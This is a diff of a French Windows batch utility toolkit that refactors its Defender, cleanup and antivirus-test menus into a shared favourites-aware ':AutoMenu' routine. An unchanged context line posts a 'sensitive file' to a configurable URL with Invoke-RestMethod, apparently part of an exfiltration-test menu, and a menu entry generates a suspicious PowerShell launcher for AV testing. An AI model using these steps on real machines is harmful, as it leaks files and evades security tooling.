+goto !AutoMenu_Target!
 
 :winre_boot
 cls
@@ -5981,7 +5756,6 @@ echo  [OK] RunOnce nettoye.
 echo.
 pause
 goto sys_winre
-
 
 REM ===================================================================
 REM              EXPORT WI-FI + LOGICIELS (COMBO TXT BUREAU)
@@ -6124,7 +5898,6 @@ timeout /t 5 /nobreak >nul
 shutdown /r /t 0
 exit
 
-
 REM ===================================================================
 REM                    SORTIE DU SCRIPT
 REM ===================================================================
@@ -6165,7 +5938,6 @@ set "ps_code=$o=($env:m_opts -split ';');$t=$env:m_title;$fl=$env:m_flags;$sel=@
 powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_code%"
 set "res=%errorlevel%"
 exit /b %res%
-
 
 :sys_unlock_notes
 cls
@@ -6220,17 +5992,9 @@ REM ===================================================================
 REM              GESTIONNAIRE WINDOWS DEFENDER
 REM ===================================================================
 :sys_defender
-cls
-set "opts=Scan Rapide~Analyse zones critiques (2-5 min);Scan Complet~Analyse tout le disque (peut durer 1h+);Mettre a jour les Signatures~Telecharger les dernieres definitions virus;Voir les Menaces Detectees~Liste des virus et malwares trouves sur ce PC;Statut Protection en Temps Reel~Affiche l etat complet de la protection Defender"
-call :DynamicMenu "GESTIONNAIRE WINDOWS DEFENDER" "%opts%"
-set "wd_c=%errorlevel%"
-if "%wd_c%"=="0" goto system_tools
-if "%wd_c%"=="1" goto wd_quick
-if "%wd_c%"=="2" goto wd_full
-if "%wd_c%"=="3" goto wd_update
-if "%wd_c%"=="4" goto wd_threats
-if "%wd_c%"=="5" goto wd_status
-goto sys_defender
+call :AutoMenu "GESTIONNAIRE WINDOWS DEFENDER" "wd_quick;wd_full;wd_update;wd_threats;wd_status"
+if "%errorlevel%"=="0" goto system_tools
+goto !AutoMenu_Target!
 
 :wd_quick
 cls
@@ -6362,44 +6126,14 @@ REM ===================================================================
 REM              MENU DE NETTOYAGE ET OPTIMISATION
 REM ===================================================================
 :sys_opti_menu
-cls
-set "opti_labels=---;sys_clean_unified;sys_registry_cleanup;---;sys_tweaks_menu;sys_startup_manager"
-set "opti_titles=[--- NETTOYAGE ET MAINTENANCE ---];Nettoyage Complet Unifie~Ouvre le panneau;Nettoyage du Registre~Optimisation rapide et suppression des entrees mortes;[--- OPTIMISATION SYSTEME ---];Menu Optimisation Windows 11~Bloatwares, Telemetrie, Performances, Cortana;Programmes au Demarrage~Lister et desactiver logiciels"
+call :AutoMenu "MENU NETTOYAGE ET OPTIMISATION" "[--- NETTOYAGE ET MAINTENANCE ---];sys_clean_unified;sys_registry_cleanup;[--- OPTIMISATION SYSTEME ---];sys_tweaks_menu;sys_startup_manager"
+if "%errorlevel%"=="0" goto system_tools
+goto !AutoMenu_Target!
 
-call :BuildFavMenu "!opti_labels!" "!opti_titles!"
-call :DynamicMenu "MENU NETTOYAGE ET OPTIMISATION" "!FAV_BUILT_OPTS!"
-set "opti_choice=%errorlevel%"
-
-if "%opti_choice%"=="2" goto sys_clean_unified
-if "%opti_choice%"=="3" goto sys_registry_cleanup
-if "%opti_choice%"=="5" goto sys_tweaks_menu
-if "%opti_choice%"=="6" goto sys_startup_manager
-if "%opti_choice%"=="0" goto system_tools
-
-if %opti_choice% GEQ 200 (
-    set /a "t_idx=%opti_choice%-200"
-    call :_bfm_get_token "!opti_labels!" !t_idx! t_target
-    if "!t_target!" NEQ "---" call :ToggleFav "!t_target!"
-    goto sys_opti_menu
-)
-
-REM ===================================================================
-REM              NETTOYAGE COMPLET UNIFIE
-REM ===================================================================
 :sys_clean_unified
-cls
-set "opts=Fichiers Temporaires et Cache~Supprime temp Windows, prefetch et cache navigateurs;Nettoyage Windows Update~Supprime les anciens fichiers WU (libere souvent 5-20 Go);Cache DNS~Vide le cache de resolution DNS local;Nettoyage Disque (cleanmgr)~Utilitaire Windows classique de nettoyage;Registre Windows~Nettoie les entrees mortes / obsoletes;Presse-papiers~Purge le contenu du presse-papiers (securite apres copie de mdp);[TOUT EN UN] Nettoyage Complet~Execute tous les nettoyages ci-dessus en sequence"
-call :DynamicMenu "NETTOYAGE COMPLET UNIFIE" "%opts%"
-set "cl_c=%errorlevel%"
-if "%cl_c%"=="0" goto sys_opti_menu
-if "%cl_c%"=="1" goto cl_temp
-if "%cl_c%"=="2" goto cl_wu
-if "%cl_c%"=="3" goto cl_dns
-if "%cl_c%"=="4" goto cl_disk
-if "%cl_c%"=="5" goto cl_registry
-if "%cl_c%"=="6" goto cl_clipboard
-if "%cl_c%"=="7" goto cl_all
-goto sys_clean_unified
+call :AutoMenu "NETTOYAGE COMPLET UNIFIE" "cl_temp;cl_wu;cl_dns;cl_disk;cl_registry;cl_clipboard;cl_all"
+if "%errorlevel%"=="0" goto sys_opti_menu
+goto !AutoMenu_Target!
 
 :cl_temp
 cls
@@ -6655,7 +6389,6 @@ echo.
 pause
 goto system_tools
 
-
 REM ===================================================================
 REM         RACCOURCIS BUREAU 1-CLIC (REDEMARRER / ETEINDRE)
 REM ===================================================================
@@ -6770,20 +6503,13 @@ echo.
 pause
 goto sys_shortcuts_bureau
 
-
 REM ===================================================================
 REM         TEST ANTIVIRUS - SCRIPTS AUTO-DECOMPRESSABLES 
 REM ===================================================================
 :sys_av_test
-cls
-set "opts=Test Faux Positif (Signature EICAR)~Cree un fichier de test EICAR inoffensif signale par 100%% des Antivirus mondiaux;Generer Launcher Heuristique (Comportemental)~Cree un script qui execute une sequence Powershell suspecte;Nettoyer les fichiers de test~Supprimer les dossiers et fichiers de test du Bureau"
-call :DynamicMenu "TEST ANTIVIRUS - SCRIPTS LANCEURS (INTERACTIFS)" "%%opts%%"
-set "av_c=%errorlevel%"
-if "%av_c%"=="0" goto menu_principal
-if "%av_c%"=="1" goto av_launcher_eicar
-if "%av_c%"=="2" goto av_launcher_heur
-if "%av_c%"=="3" goto av_clean
-goto sys_av_test
+call :AutoMenu "TEST ANTIVIRUS - SCRIPTS LANCEURS" "av_launcher_eicar;av_launcher_heur;av_clean"
+if "%errorlevel%"=="0" goto menu_principal
+goto !AutoMenu_Target!
 
 :av_launcher_eicar
 cls
@@ -6866,7 +6592,6 @@ echo  [OK] Dossiers de test supprimes du Bureau.
 echo.
 pause
 goto sys_av_test
-
 
 :sys_temp_report
 cls
@@ -7026,7 +6751,6 @@ if "%exf_choice%"=="3" (
 )
 if "%exf_choice%"=="4" goto smb_exp_menu
 
-
 if defined target_file (
     echo [i] Envoi du fichier sensible...
     powershell -Command "Invoke-RestMethod -Uri '%web_url%' -Method Post -InFile '%target_file%' -ContentType 'application/octet-stream'"
@@ -7095,52 +6819,68 @@ if %errorlevel% equ 0 (
 )
 exit /b
 
-
 REM ===================================================================
-REM  :BuildFavMenu - Construit une liste d'options avec marquage (F)
-REM  Usage : call :BuildFavMenu "label1;label2" "Titre1;Titre2"
-REM  Resultat lu dans %FAV_BUILT_OPTS%
+REM  :AutoMenu - Moteur unifie de menus dynamiques avec favoris globaux
+REM  Usage : call :AutoMenu "TITRE" "label1;label2;[--- SECTION ---];label3" "NONUMS"
 REM ===================================================================
-:BuildFavMenu
-setlocal EnableDelayedExpansion
-set "_labels=%~1"
-set "_titles=%~2"
-set "_out="
-set /a "_i=0"
+:AutoMenu
+set "am_title=%~1"
+set "am_labels=%~2"
+set "am_flags=%~3"
 
-:_bfm_loop
-set /a "_i+=1"
-call :_bfm_get_token "!_labels!" %_i% _lbl
-call :_bfm_get_token "!_titles!" %_i% _ttl
-if not defined _lbl goto _bfm_end
+:am_loop
+set "am_opts="
+set /a am_idx=0
+set "remain=%am_labels%"
 
-set "_is_f=0"
-for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do (
-    if "%%F"=="!_lbl!" set "_is_f=1"
+:am_parse
+for /f "tokens=1* delims=;" %%A in ("%remain%") do (
+    set "lbl=%%A"
+    set "remain=%%B"
+
+    if "!lbl:~0,4!"=="[---" (
+        set "am_opts=!am_opts!;!lbl!"
+    ) else (
+        set /a am_idx+=1
+        set "am_target[!am_idx!]=!lbl!"
+
+        REM Recuperer le titre via la map globale (double expansion)
+        call set "entry=%%map_!lbl!%%"
+        if not defined entry set "entry=!lbl!"
+
+        REM Verifier si c est un favori
+        set "is_f=0"
+        if exist "%SCRIPT_DIR%\favoris.txt" (
+            for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do (
+                if "%%F"=="!lbl!" set "is_f=1"
+            )
+        )
+
+        if "!is_f!"=="1" (
+            set "am_opts=!am_opts!;(F) !entry!"
+        ) else (
+            set "am_opts=!am_opts!;!entry!"
+        )
+    )
+)
+if defined remain goto am_parse
+set "am_opts=!am_opts:~1!"
+
+call :DynamicMenu "%am_title%" "!am_opts!" "%am_flags%"
+set "am_c=!errorlevel!"
+
+if "!am_c!"=="0" exit /b 0
+
+if !am_c! GEQ 200 (
+    set /a t_idx=!am_c!-200
+    for %%X in (!t_idx!) do call :ToggleFav "!am_target[%%X]!"
+    goto am_loop
 )
 
-if "!_is_f!"=="1" (
-    set "_out=!_out!;(F) !_ttl!"
-) else (
-    set "_out=!_out!;!_ttl!"
-)
-goto _bfm_loop
-
-:_bfm_get_token
-setlocal EnableDelayedExpansion
-set "str=%~1"
-set "idx=%~2"
-set "rtn="
-for /f "tokens=%idx% delims=;" %%a in ("!str!") do set "rtn=%%a"
-endlocal & set "%~3=%rtn%"
-exit /b
-
-:_bfm_end
-set "_out=!_out:~1!"
-endlocal & set "FAV_BUILT_OPTS=%_out%"
-exit /b
-
+for %%X in (!am_c!) do set "AutoMenu_Target=!am_target[%%X]!"
+exit /b 1
 
 REM ===================================================================
 REM                         FIN DU SCRIPT
 REM ===================================================================
+
